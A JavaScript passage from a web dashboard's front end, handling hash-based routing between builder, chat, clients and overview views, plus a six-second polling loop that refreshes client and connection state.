    const r = (location.hash || "").replace(/^#\/?/, "") || "builder";
    if (VIEWS[r] && r !== S.route) {
      S.route = r;
      if (r === "chat") S.chat.unread = 0;
      render();
    }
  });
  // Deliberately not tracked in S.timers: navigation must not kill liveness.
  setInterval(async () => {
    try {
      const before = S.clients.map((c) => c.id).join(",");
      const was = S.connected;
      await state();
      const after = S.clients.map((c) => c.id).join(",");
      if (was !== S.connected) render();
      else if (before !== after) {
        if (S.route === "clients" || S.route === "overview") render();
        else syncChrome();
      }
      else if (S.route === "overview" || S.route === "clients") renderTop();
    } catch (e) { /* ignore polling errors */ }
  }, 6000);
}

document.addEventListener("DOMContentLoaded", boot);
